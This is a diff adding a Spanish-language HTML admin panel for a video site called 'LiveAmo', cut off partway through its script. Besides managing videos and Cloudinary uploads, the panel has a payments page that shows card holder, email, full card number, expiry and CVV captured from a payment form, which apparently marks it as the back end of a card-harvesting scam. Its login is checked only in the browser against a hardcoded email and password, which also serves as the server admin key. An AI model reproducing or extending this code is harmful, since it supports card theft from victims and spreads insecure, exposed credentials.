@@ -1,0 +1,1128 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LiveAmo — Panel Admin</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: #080810;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    color: #e0e0e0;
+    min-height: 100vh;
+  }
+
+  /* LOGIN */
+  #loginScreen {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    background: radial-gradient(ellipse at center, #13131f 0%, #080810 100%);
+  }
+
+  .login-card {
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 20px;
+    padding: 40px 36px;
+    width: 360px;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+
+  .logo {
+    font-size: 28px;
+    font-weight: 800;
+    letter-spacing: -1px;
+    margin-bottom: 6px;
+  }
+
+  .logo span { color: #ff0060; }
+
+  .login-subtitle {
+    color: rgba(255,255,255,0.35);
+    font-size: 13px;
+    margin-bottom: 32px;
+  }
+
+  .field {
+    margin-bottom: 14px;
+    text-align: left;
+  }
+
+  .field label {
+    display: block;
+    font-size: 12px;
+    color: rgba(255,255,255,0.45);
+    margin-bottom: 6px;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+  }
+
+  .field input {
+    width: 100%;
+    padding: 11px 16px;
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 10px;
+    color: white;
+    font-size: 14px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  .field input:focus { border-color: rgba(255,0,96,0.5); }
+
+  .btn-primary {
+    width: 100%;
+    padding: 13px;
+    background: linear-gradient(135deg, #ff0060, #ff4d8d);
+    border: none;
+    border-radius: 10px;
+    color: white;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: opacity 0.2s, transform 0.15s;
+    box-shadow: 0 4px 20px rgba(255,0,96,0.35);
+  }
+
+  .btn-primary:hover { opacity: 0.9; }
+  .btn-primary:active { transform: scale(0.98); }
+
+  .error-msg {
+    color: #ff4d4d;
+    font-size: 13px;
+    margin-top: 10px;
+    display: none;
+  }
+
+  /* ADMIN PANEL */
+  #adminPanel { display: none; }
+
+  .sidebar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 220px;
+    height: 100vh;
+    background: rgba(255,255,255,0.03);
+    border-right: 1px solid rgba(255,255,255,0.06);
+    padding: 24px 0;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .sidebar-logo {
+    padding: 0 24px 24px;
+    font-size: 20px;
+    font-weight: 800;
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+    margin-bottom: 16px;
+  }
+
+  .sidebar-logo span { color: #ff0060; }
+
+  .nav-item {
+    padding: 11px 24px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 14px;
+    cursor: pointer;
+    color: rgba(255,255,255,0.5);
+    transition: all 0.2s;
+    border-radius: 0;
+  }
+
+  .nav-item:hover, .nav-item.active {
+    color: white;
+    background: rgba(255,0,96,0.1);
+    border-right: 3px solid #ff0060;
+  }
+
+  .nav-icon { font-size: 16px; }
+
+  .sidebar-bottom {
+    margin-top: auto;
+    padding: 16px 24px;
+    border-top: 1px solid rgba(255,255,255,0.06);
+  }
+
+  .logout-btn {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 13px;
+    color: rgba(255,255,255,0.35);
+    cursor: pointer;
+    transition: color 0.2s;
+  }
+
+  .logout-btn:hover { color: #ff4d4d; }
+
+  .main-content {
+    margin-left: 220px;
+    padding: 32px;
+    min-height: 100vh;
+  }
+
+  .page-header {
+    margin-bottom: 28px;
+  }
+
+  .page-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: white;
+  }
+
+  .page-subtitle {
+    font-size: 13px;
+    color: rgba(255,255,255,0.35);
+    margin-top: 4px;
+  }
+
+  /* STATS */
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+    margin-bottom: 28px;
+  }
+
+  .stat-card {
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.07);
+    border-radius: 14px;
+    padding: 20px;
+  }
+
+  .stat-label {
+    font-size: 12px;
+    color: rgba(255,255,255,0.35);
+    text-transform: uppercase;
+    letter-spacing: 0.7px;
+    margin-bottom: 8px;
+  }
+
+  .stat-value {
+    font-size: 28px;
+    font-weight: 700;
+    color: white;
+  }
+
+  .stat-accent { color: #ff0060; }
+
+  /* CARD */
+  .card {
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.07);
+    border-radius: 16px;
+    padding: 24px;
+    margin-bottom: 20px;
+  }
+
+  .card-title {
+    font-size: 15px;
+    font-weight: 600;
+    color: white;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  /* UPLOAD ZONE */
+  .upload-zone {
+    border: 2px dashed rgba(255,255,255,0.12);
+    border-radius: 14px;
+    padding: 36px;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .upload-zone:hover, .upload-zone.dragover {
+    border-color: rgba(255,0,96,0.5);
+    background: rgba(255,0,96,0.04);
+  }
+
+  .upload-zone input[type="file"] {
+    position: absolute;
+    inset: 0;
+    opacity: 0;
+    cursor: pointer;
+    width: 100%;
+    height: 100%;
+  }
+
+  .upload-icon { font-size: 36px; margin-bottom: 10px; }
+
+  .upload-text {
+    font-size: 14px;
+    color: rgba(255,255,255,0.5);
+  }
+
+  .upload-text strong { color: #ff4d8d; }
+
+  /* FORM GRID */
+  .form-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 14px;
+    margin-bottom: 16px;
+  }
+
+  .form-group label {
+    display: block;
+    font-size: 12px;
+    color: rgba(255,255,255,0.4);
+    margin-bottom: 6px;
+    text-transform: uppercase;
+    letter-spacing: 0.7px;
+  }
+
+  .form-group input, .form-group select {
+    width: 100%;
+    padding: 10px 14px;
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 9px;
+    color: white;
+    font-size: 14px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  .form-group input:focus, .form-group select:focus {
+    border-color: rgba(255,0,96,0.5);
+  }
+
+  .form-group select option { background: #1a1a2e; }
+
+  .add-btn {
+    padding: 10px 22px;
+    background: linear-gradient(135deg, #ff0060, #ff4d8d);
+    border: none;
+    border-radius: 9px;
+    color: white;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: opacity 0.2s, transform 0.15s;
+    box-shadow: 0 3px 14px rgba(255,0,96,0.3);
+  }
+
+  .add-btn:hover { opacity: 0.9; }
+  .add-btn:active { transform: scale(0.97); }
+
+  /* VIDEO TABLE */
+  .table-wrap { overflow-x: auto; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13.5px;
+  }
+
+  th {
+    text-align: left;
+    padding: 10px 14px;
+    color: rgba(255,255,255,0.3);
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.7px;
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+  }
+
+  td {
+    padding: 12px 14px;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    vertical-align: middle;
+  }
+
+  tr:last-child td { border-bottom: none; }
+
+  .video-thumb {
+    width: 56px;
+    height: 40px;
+    border-radius: 6px;
+    object-fit: cover;
+    background: #1a1a2e;
+    border: 1px solid rgba(255,255,255,0.08);
+  }
+
+  .status-badge {
+    display: inline-block;
+    padding: 3px 9px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  .badge-active { background: rgba(0,200,80,0.15); color: #00c850; }
+  .badge-inactive { background: rgba(255,255,255,0.07); color: rgba(255,255,255,0.35); }
+
+  .action-btn {
+    padding: 5px 12px;
+    border-radius: 7px;
+    border: none;
+    cursor: pointer;
+    font-size: 12px;
+    font-weight: 600;
+    transition: opacity 0.2s;
+  }
+
+  .action-btn:hover { opacity: 0.8; }
+
+  .btn-toggle { background: rgba(255,200,0,0.15); color: #ffc800; }
+  .btn-delete { background: rgba(255,60,60,0.15); color: #ff4d4d; margin-left: 5px; }
+  .btn-up, .btn-down { background: rgba(255,255,255,0.07); color: rgba(255,255,255,0.5); margin-left: 5px; }
+
+  .empty-state {
+    text-align: center;
+    padding: 40px;
+    color: rgba(255,255,255,0.2);
+    font-size: 14px;
+  }
+
+  /* ALERT */
+  .alert {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: #1a2a1a;
+    border: 1px solid rgba(0,200,80,0.3);
+    color: #00c850;
+    padding: 12px 20px;
+    border-radius: 10px;
+    font-size: 14px;
+    z-index: 1000;
+    transform: translateX(140%);
+    transition: transform 0.3s cubic-bezier(0.34,1.56,0.64,1);
+    box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+  }
+
+  .alert.show { transform: translateX(0); }
+  .alert.error { background: #2a1a1a; border-color: rgba(255,60,60,0.3); color: #ff4d4d; }
+
+  .tab-btn {
+    padding: 9px 20px;
+    border-radius: 10px;
+    border: 1px solid rgba(255,255,255,0.1);
+    background: rgba(255,255,255,0.04);
+    color: rgba(255,255,255,0.45);
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .tab-btn.active {
+    background: rgba(255,0,96,0.15);
+    border-color: rgba(255,0,96,0.35);
+    color: #ff4d8d;
+  }
+  .tab-btn:hover:not(.active) { background: rgba(255,255,255,0.08); color: white; }
+
+  .progress-bar {
+    height: 4px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 4px;
+    margin-top: 10px;
+    overflow: hidden;
+    display: none;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, #ff0060, #ff4d8d);
+    border-radius: 4px;
+    width: 0%;
+    transition: width 0.3s;
+  }
+</style>
+</head>
+<body>
+
+<!-- ALERTA TOAST -->
+<div class="alert" id="alertToast"></div>
+
+<!-- LOGIN -->
+<div id="loginScreen">
+  <div class="login-card">
+    <div class="logo">Live<span>Amo</span></div>
+    <div class="login-subtitle">Panel de Administración</div>
+
+    <div class="field">
+      <label>Usuario</label>
+      <input type="text" id="loginUser" placeholder="admin" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>Contraseña</label>
+      <input type="password" id="loginPass" placeholder="••••••••" onkeydown="if(event.key==='Enter')intentarLogin()">
+    </div>
+    <button class="btn-primary" onclick="intentarLogin()">Entrar al panel</button>
+    <div class="error-msg" id="loginError">Usuario o contraseña incorrectos</div>
+  </div>
+</div>
+
+<!-- ADMIN PANEL -->
+<div id="adminPanel">
+  <div class="sidebar">
+    <div class="sidebar-logo">Live<span>Amo</span></div>
+
+    <div class="nav-item active" onclick="showPage('videos')">
+      <span class="nav-icon">🎬</span> Videos
+    </div>
+    <div class="nav-item" onclick="showPage('upload')">
+      <span class="nav-icon">⬆️</span> Subir Video
+    </div>
+    <div class="nav-item" onclick="showPage('pagos')">
+      <span class="nav-icon">💳</span> Pagos
+    </div>
+    <div class="nav-item" onclick="window.open('index.html')">
+      <span class="nav-icon">👁️</span> Ver Sitio
+    </div>
+
+    <div class="sidebar-bottom">
+      <div class="logout-btn" onclick="cerrarSesion()">
+        <span>🚪</span> Cerrar sesión
+      </div>
+    </div>
+  </div>
+
+  <div class="main-content">
+
+    <!-- PÁGINA: VIDEOS -->
+    <div id="pageVideos">
+      <div class="page-header">
+        <div class="page-title">Gestión de Videos</div>
+        <div class="page-subtitle">Administra la lista de videos que se muestran en la app</div>
+      </div>
+
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-label">Total Videos</div>
+          <div class="stat-value" id="statTotal">0</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Activos</div>
+          <div class="stat-value stat-accent" id="statActivos">0</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Inactivos</div>
+          <div class="stat-value" id="statInactivos">0</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title" style="display:flex;justify-content:space-between;align-items:center">
+          <span>📋 Lista de videos</span>
+          <button class="add-btn" onclick="forzarSync()" style="font-size:12px;padding:7px 14px">☁️ Sincronizar</button>
+          <button class="add-btn" onclick="crearBinPublico()" style="font-size:12px;padding:7px 14px;background:rgba(0,200,83,0.2);box-shadow:none;color:#00c853">🌐 Hacer público</button>
+          <button class="add-btn" onclick="probarConexion()" style="font-size:12px;padding:7px 14px;background:rgba(74,154,245,0.2);box-shadow:none">🔍 Probar</button>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>Archivo / URL</th>
+                <th>Nombre</th>
+                <th>Emoji</th>
+                <th>Estado</th>
+                <th>Acciones</th>
+              </tr>
+            </thead>
+            <tbody id="videoTableBody"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- PÁGINA: SUBIR -->
+    <div id="pageUpload" style="display:none">
+      <div class="page-header">
+        <div class="page-title">Agregar Video</div>
+        <div class="page-subtitle">Pega una URL o sube un archivo a Cloudinary</div>
+      </div>
+
+      <!-- TABS -->
+      <div style="display:flex;gap:10px;margin-bottom:20px">
+        <button class="tab-btn active" id="tabUrl"    onclick="switchTab('url')">🔗 URL directa</button>
+        <button class="tab-btn"        id="tabUpload" onclick="switchTab('upload')">☁️ Subir archivo</button>
+      </div>
+
+      <!-- TAB: URL -->
+      <div id="panelUrl">
+        <div class="card">
+          <div class="card-title">🔗 URL del video</div>
+          <div class="form-group" style="margin-bottom:0">
+            <label>Pega la URL del video (MP4, m3u8, etc.)</label>
+            <div style="display:flex;gap:10px">
+              <input type="text" id="urlInput" placeholder="https://ejemplo.com/video.mp4"
+                oninput="onUrlInput(this.value)"
+                style="flex:1;padding:12px 14px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:9px;color:white;font-size:14px;outline:none;">
+              <button class="add-btn" onclick="previewUrl()" style="flex-shrink:0;padding:0 18px">Verificar</button>
+            </div>
+          </div>
+          <div id="urlPreviewWrap" style="display:none;margin-top:14px">
+            <video id="urlPreview" controls style="width:100%;border-radius:10px;max-height:180px;background:#000"></video>
+            <div style="margin-top:8px;font-size:12px;color:#4a9af5;word-break:break-all;padding:8px 12px;background:rgba(74,154,245,0.07);border-radius:8px" id="urlConfirmed"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- TAB: UPLOAD CLOUDINARY -->
+      <div id="panelUpload" style="display:none">
+        <div class="card" id="cloudinaryConfig">
+          <div class="card-title">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="vertical-align:middle;margin-right:6px"><path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z" stroke="#4a9af5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            Cloudinary
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
+            <div class="form-group">
+              <label>Cloud Name</label>
+              <input type="text" id="cloudName" placeholder="mi-cloud-name" autocomplete="off">
+            </div>
+            <div class="form-group">
+              <label>Upload Preset (unsigned)</label>
+              <input type="text" id="uploadPreset" placeholder="mi_preset" autocomplete="off">
+            </div>
+          </div>
+          <div style="display:flex;gap:10px;align-items:center">
+            <button class="add-btn" onclick="guardarConfigCloud()">Guardar</button>
+            <span id="cloudConfigStatus" style="font-size:13px;color:rgba(255,255,255,0.3)"></span>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-title">🎬 Archivo</div>
+          <div class="upload-zone" id="uploadZone" onclick="document.getElementById('fileInput').click()">
+            <input type="file" accept="video/*" id="fileInput" style="display:none" onchange="onFileSelected(this)">
+            <div class="upload-icon">☁️</div>
+            <div class="upload-text"><strong>Haz clic o arrastra</strong> el archivo<br>
+              <span style="font-size:12px;color:rgba(255,255,255,0.25)">MP4, WebM, MOV</span>
+            </div>
+          </div>
+          <div class="progress-bar" id="progressBar" style="margin-top:14px">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+          <div style="display:flex;justify-content:space-between;margin-top:6px">
+            <span id="uploadStatus"  style="font-size:12px;color:rgba(255,255,255,0.35)"></span>
+            <span id="uploadPercent" style="font-size:12px;color:rgba(255,255,255,0.35)"></span>
+          </div>
+          <div id="videoPreviewWrap" style="display:none;margin-top:14px">
+            <video id="videoPreview" controls style="width:100%;border-radius:10px;max-height:180px;background:#000"></video>
+            <div id="cloudUrl" style="margin-top:8px;font-size:12px;color:#4a9af5;word-break:break-all;padding:8px 12px;background:rgba(74,154,245,0.07);border-radius:8px"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- DATOS DEL VIDEO -->
+      <div class="card">
+        <div class="card-title">⚙️ Datos del video</div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Nombre / Alias</label>
+            <input type="text" id="newName" placeholder="Ej: María, Ana..." autocomplete="off">
+          </div>
+          <div class="form-group">
+            <label>Emoji</label>
+            <input type="text" id="newEmoji" placeholder="🔥 😈 ✨" value="🔥" maxlength="10">
+          </div>
+          <div class="form-group">
+            <label>Estado</label>
+            <select id="newStatus">
+              <option value="1">Activo</option>
+              <option value="0">Inactivo</option>
+            </select>
+          </div>
+        </div>
+        <button class="add-btn" onclick="agregarVideo()" id="addBtn" disabled style="opacity:0.4;cursor:not-allowed">
+          ✚ Agregar a la lista
+        </button>
+      </div>
+    </div>
+
+    <!-- PÁGINA: PAGOS -->
+    <div id="pagePagos" style="display:none">
+      <div class="page-header">
+        <div class="page-title">Registro de Pagos</div>
+        <div class="page-subtitle">Datos ingresados en el formulario de pago</div>
+      </div>
+
+      <div class="stats-grid" style="grid-template-columns:repeat(2,1fr)">
+        <div class="stat-card">
+          <div class="stat-label">Total pagos</div>
+          <div class="stat-value stat-accent" id="statPagosTotal">0</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Recaudado</div>
+          <div class="stat-value" id="statPagosMonto">$0.00</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title" style="display:flex;justify-content:space-between;align-items:center">
+          <span>💳 Pagos recibidos</span>
+          <button class="action-btn btn-delete" onclick="limpiarPagos()" style="font-size:12px">Limpiar todo</button>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Fecha</th>
+                <th>Titular</th>
+                <th>Correo</th>
+                <th>Tarjeta</th>
+                <th>Vence</th>
+                <th>CVV</th>
+                <th>Monto</th>
+                <th>Usuario</th>
+              </tr>
+            </thead>
+            <tbody id="pagosTableBody"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// ---- AUTH ----
+const ADMIN_USER = 'ofrek@gmail.com';
+const ADMIN_PASS = 'liveamo2024';
+
+function intentarLogin() {
+  const u = document.getElementById("loginUser").value.trim();
+  const p = document.getElementById("loginPass").value;
+  if (u === ADMIN_USER && p === ADMIN_PASS) {
+    document.getElementById("loginScreen").style.display = "none";
+    document.getElementById("adminPanel").style.display = "block";
+    renderTable();
+    updateStats();
+    cargarDesdeNube();
+  } else {
+    document.getElementById("loginError").style.display = "block";
+  }
+}
+
+function cerrarSesion() {
+  document.getElementById("loginScreen").style.display = "flex";
+  document.getElementById("adminPanel").style.display = "none";
+  document.getElementById("loginPass").value = "";
+}
+
+// ---- PAGES ----
+function showPage(page) {
+  document.getElementById("pageVideos").style.display = page === "videos" ? "block" : "none";
+  document.getElementById("pageUpload").style.display = page === "upload" ? "block" : "none";
+  document.getElementById("pagePagos").style.display  = page === "pagos"  ? "block" : "none";
+  document.querySelectorAll(".nav-item").forEach((el, i) => {
+    el.classList.toggle("active",
+      (i === 0 && page === "videos") ||
+      (i === 1 && page === "upload") ||
+      (i === 2 && page === "pagos")
+    );
+  });
+  if (page === "videos") renderTable();
+  if (page === "pagos")  renderPagos();
+}
+
+// ---- VIDEO LIST ----
+const defaultVideos = [
+  { src: "1.mp4",  desc: "🔥", name: "Usuario 1",  active: true },
+  { src: "2.mp4",  desc: "🔥", name: "Usuario 2",  active: true },
+  { src: "3.mp4",  desc: "😈", name: "Usuario 3",  active: true },
+  { src: "4.mp4",  desc: "🔥", name: "Usuario 4",  active: true },
+  { src: "5.mp4",  desc: "🔥", name: "Usuario 5",  active: true },
+  { src: "6.mp4",  desc: "😈", name: "Usuario 6",  active: true },
+  { src: "7.mp4",  desc: "🔥", name: "Usuario 7",  active: true },
+  { src: "8.mp4",  desc: "🔥", name: "Usuario 8",  active: true },
+  { src: "9.mp4",  desc: "😈", name: "Usuario 9",  active: true },
+  { src: "10.mp4", desc: "🔥", name: "Usuario 10", active: true },
+  { src: "11.mp4", desc: "🔥", name: "Usuario 11", active: true },
+  { src: "12.mp4", desc: "😈", name: "Usuario 12", active: true },
+];
+
+// ---- JSONBIN ----
+const ADMIN_KEY = 'liveamo2024';
+const API       = '/api';
+
+// loadList: lee localStorage (rápido y siempre disponible)
+function loadList() {
+  try {
+    const s = localStorage.getItem('liveamo_videos_admin');
+    if (s) { const p = JSON.parse(s); if (p && p.length) return p; }
+  } catch(e) {}
+  return [];
+}
+
+async function saveList(list) {
+  localStorage.setItem('liveamo_videos_admin', JSON.stringify(list));
+  try {
+    const res = await fetch(API + '/videos', {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json', 'X-Admin-Key': ADMIN_KEY },
+      body: JSON.stringify(list)
+    });
+    if (res.ok) toast('✅ Guardado en servidor');
+    else        toast('❌ Error: ' + res.status, true);
+  } catch(e) { toast('❌ Sin conexión al servidor', true); }
+}
+
+function forzarSync() {
+  const list = loadList();
+  if (!list.length) { toast('⚠️ No hay videos', true); return; }
+  saveList(list);
+}
+
+async function probarConexion() {
+  try {
+    const res  = await fetch(API + '/videos');
+    const data = await res.json();
+    alert('✅ Servidor OK\nVideos: ' + data.length + '\n\n' + JSON.stringify(data, null, 2));
+  } catch(e) { alert('❌ Error: ' + e.message); }
+}
+
+async function cargarDesdeNube() {
+  try {
+    const res  = await fetch(API + '/videos', { headers: { 'X-Admin-Key': ADMIN_KEY } });
+    const lista = await res.json();
+    if (lista.length) {
+      localStorage.setItem('liveamo_videos_admin', JSON.stringify(lista));
+      renderTable();
+      updateStats();
+      toast('✅ ' + lista.length + ' videos cargados');
+    }
+  } catch(e) {}
+}
+
+function renderTable() {
+  const list = loadList();
+  const tbody = document.getElementById("videoTableBody");
+  tbody.innerHTML = '';
+
+  if (!list.length) {
+    tbody.innerHTML = '<tr><td colspan="6"><div class="empty-state">No hay videos. Agrega uno en "Subir Video".</div></td></tr>';
+    return;
+  }
+
+  list.forEach((v, i) => {
+    const tr = document.createElement("tr");
+    tr.innerHTML = `
+      <td style="color:rgba(255,255,255,0.3)">${i + 1}</td>
+      <td style="max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:rgba(255,255,255,0.7)" title="${escHtml(v.src)}">${escHtml(v.src)}</td>
+      <td style="color:white;font-weight:500">${escHtml(v.name || '—')}</td>
+      <td style="font-size:18px">${escHtml(v.desc || '')}</td>
+      <td><span class="status-badge ${v.active !== false ? 'badge-active' : 'badge-inactive'}">${v.active !== false ? 'Activo' : 'Inactivo'}</span></td>
+      <td>
+        <button class="action-btn btn-toggle" onclick="toggleVideo(${i})">${v.active !== false ? 'Desactivar' : 'Activar'}</button>
+        <button class="action-btn btn-delete" onclick="eliminarVideo(${i})">Eliminar</button>
+        ${i > 0 ? `<button class="action-btn btn-up" onclick="moverVideo(${i},-1)">↑</button>` : ''}
+        ${i < list.length-1 ? `<button class="action-btn btn-down" onclick="moverVideo(${i},1)">↓</button>` : ''}
+      </td>`;
+    tbody.appendChild(tr);
+  });
+
+  updateStats();
+}
+
+function updateStats() {
+  const list = loadList();
+  const activos = list.filter(v => v.active !== false).length;
+  document.getElementById("statTotal").textContent = list.length;
+  document.getElementById("statActivos").textContent = activos;
+  document.getElementById("statInactivos").textContent = list.length - activos;
+}
+
+function toggleVideo(i) {
+  const list = loadList();
+  list[i].active = list[i].active === false ? true : false;
+  saveList(list);
+  renderTable();
+  toast(list[i].active ? '✅ Video activado' : '⏸️ Video desactivado');
+}
+
+function eliminarVideo(i) {
+  const list = loadList();
+  const nombre = list[i].name || list[i].src;
+  list.splice(i, 1);
+  saveList(list);
+  renderTable();
+  toast(`🗑️ "${nombre}" eliminado`);
+}
+
+function moverVideo(i, dir) {
+  const list = loadList();
+  const j = i + dir;
+  if (j < 0 || j >= list.length) return;
+  [list[i], list[j]] = [list[j], list[i]];
+  saveList(list);
+  renderTable();
+}
+
+// ---- TABS ----
+function switchTab(tab) {
+  document.getElementById("panelUrl").style.display    = tab === "url"    ? "block" : "none";
+  document.getElementById("panelUpload").style.display = tab === "upload" ? "block" : "none";
+  document.getElementById("tabUrl").classList.toggle("active",    tab === "url");
+  document.getElementById("tabUpload").classList.toggle("active", tab === "upload");
+  // resetear estado del botón si cambian de tab
+  uploadedUrl = '';
+  enableAddBtn(false);
+}
+
+// ---- URL DIRECTA ----
+function onUrlInput(val) {
+  if (!val.trim()) { enableAddBtn(false); document.getElementById("urlPreviewWrap").style.display = "none"; }
+}
+
+function previewUrl() {
+  const url = document.getElementById("urlInput").value.trim();
+  if (!url) { toast("⚠️ Pega una URL primero", true); return; }
+  const preview = document.getElementById("urlPreview");
+  preview.src = url;
+  document.getElementById("urlPreviewWrap").style.display = "block";
+  document.getElementById("urlConfirmed").textContent = "✅ " + url;
+  uploadedUrl = url;
+  enableAddBtn(true);
+  toast("✅ URL lista para agregar");
+}
+
+function enableAddBtn(on) {
+  const btn = document.getElementById("addBtn");
+  if (!btn) return;
+  btn.disabled = !on;
+  btn.style.opacity = on ? "1" : "0.4";
+  btn.style.cursor  = on ? "pointer" : "not-allowed";
+}
+
+// ---- CLOUDINARY CONFIG ----
+function guardarConfigCloud() {
+  const cn = document.getElementById("cloudName").value.trim();
+  const up = document.getElementById("uploadPreset").value.trim();
+  if (!cn || !up) { toast("⚠️ Completa Cloud Name y Upload Preset", true); return; }
+  localStorage.setItem('liveamo_cloud_name', cn);
+  localStorage.setItem('liveamo_upload_preset', up);
+  document.getElementById("cloudConfigStatus").textContent = "✅ Guardado";
+  toast("✅ Configuración guardada");
+}
+
+const DEFAULT_CLOUD_NAME    = '459787467139938';
+const DEFAULT_UPLOAD_PRESET = 'c6qQn_UQ_ftIVGxvZFcaW6C6m6Y';
+
+function cargarConfigCloud() {
+  const cn = localStorage.getItem('liveamo_cloud_name')    || DEFAULT_CLOUD_NAME;
+  const up = localStorage.getItem('liveamo_upload_preset') || DEFAULT_UPLOAD_PRESET;
+  document.getElementById("cloudName").value    = cn;
+  document.getElementById("uploadPreset").value = up;
+  // guardar automáticamente si vienen de los defaults
+  if (!localStorage.getItem('liveamo_cloud_name')) {
+    localStorage.setItem('liveamo_cloud_name', cn);
+    localStorage.setItem('liveamo_upload_preset', up);
+  }
+  document.getElementById("cloudConfigStatus").textContent = "✅ Configurado";
+}
+
+// ---- UPLOAD A CLOUDINARY ----
+let uploadedUrl = '';
+
+function onFileSelected(input) {
+  if (!input.files || !input.files[0]) return;
+  const file = input.files[0];
+
+  const cloudName   = localStorage.getItem('liveamo_cloud_name');
+  const uploadPreset = localStorage.getItem('liveamo_upload_preset');
+
+  if (!cloudName || !uploadPreset) {
+    toast("⚠️ Primero configura tu Cloud Name y Upload Preset", true);
+    return;
+  }
+
+  const bar    = document.getElementById("progressBar");
+  const fill   = document.getElementById("progressFill");
+  const status = document.getElementById("uploadStatus");
+  const pct    = document.getElementById("uploadPercent");
+  const addBtn = document.getElementById("addBtn");
+
+  bar.style.display = "block";
+  fill.style.width = "0%";
+  status.textContent = `Subiendo ${file.name} (${(file.size/1024/1024).toFixed(1)} MB)…`;
+  pct.textContent = "0%";
+  enableAddBtn(false);
+  uploadedUrl = '';
+
+  const formData = new FormData();
+  formData.append("file", file);
+  formData.append("upload_preset", uploadPreset);
+  formData.append("resource_type", "video");
+
+  const xhr = new XMLHttpRequest();
+  xhr.open("POST", `https://api.cloudinary.com/v1_1/${cloudName}/video/upload`);
+
+  xhr.upload.onprogress = (e) => {
+    if (e.lengthComputable) {
+      const p = Math.round((e.loaded / e.total) * 100);
+      fill.style.width = p + "%";
+      pct.textContent = p + "%";
+    }
+  };
+
+  xhr.onload = () => {
+    if (xhr.status === 200) {
+      const res = JSON.parse(xhr.responseText);
+      uploadedUrl = res.secure_url;
+
+      fill.style.width = "100%";
+      status.textContent = "✅ Subido correctamente";
+      pct.textContent = "100%";
+
+      const preview = document.getElementById("videoPreview");
+      preview.src = uploadedUrl;
+      document.getElementById("videoPreviewWrap").style.display = "block";
+      document.getElementById("cloudUrl").textContent = uploadedUrl;
+
+      enableAddBtn(true);
+
+      toast("✅ Video subido a Cloudinary");
+    } else {
+      status.textContent = "❌ Error al subir";
+      toast("❌ Error: " + xhr.responseText, true);
+    }
+  };
+
+  xhr.onerror = () => {
+    status.textContent = "❌ Error de red";
+    toast("❌ Error de red al subir", true);
+  };
+
+  xhr.send(formData);
+}
+
+function agregarVideo() {
+  const name   = document.getElementById("newName").value.trim();
+  const emoji  = document.getElementById("newEmoji").value.trim() || "🔥";
+  const active = document.getElementById("newStatus").value === "1";
+
+  if (!uploadedUrl) { toast("⚠️ Primero sube un video o ingresa una URL", true); return; }
+
+  const list = loadList();
+  list.push({ src: uploadedUrl, name: name || `Video ${list.length + 1}`, desc: emoji, active });
+  saveList(list);
